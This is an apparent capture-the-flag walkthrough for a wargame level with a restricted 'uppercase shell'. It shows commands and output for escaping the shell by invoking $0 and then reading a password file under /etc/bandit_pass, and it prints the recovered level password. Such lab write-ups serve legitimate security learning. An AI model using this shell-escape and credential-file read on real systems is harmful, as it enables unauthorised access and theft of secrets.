# 56a9bf19c63d650ce78e6ec0354ee45e

# *login*
# ->
# ...
# WELCOME TO THE UPPERCASE SHELL


ls # ->
# sh: 1: LS: not found

# okay....
echo hello # ->
# sh: 1: ECHO: not found

# I guess this shell converts all letters to uppercase and then
# calls 'eval' or something on the uppercased string
# At least we see that after uppercasing the shell being run is sh

# let's try and force the shell to lowercase some variables for us
ECHO=ECHO
HELLOWORLD=HELLOWORLD
${ECHO,,*} ${HELLOWORLD,,*}
# ->
# sh: 1: Bad substitution

# crap, looks like the shell they're running doesn't support the
# lowercasing variable substitution feature

# well, what are all the arguments passed to the shell?
_$0
# ->
# sh: 1: _sh: not found

# so the program being run is sh

_$1
# ->
# sh: 1: _: not found

# looks like there's no second argument

# let's just run the first argument, thus running a new shell!

$0
# ->
# $

# we have shell!

ls
# ->
# uppershell

# I guess that's the shell we were in. cool. for curiosity, what's
# in it?
cat uppershell
# ->
# (a bunch of binary crap)

# guess we'll never know. wtvr. we already have a shell anyway
cat /etc/bandit_pass/bandit33
# ->
# c9c3199ddf4121b10cf581a98d51caee
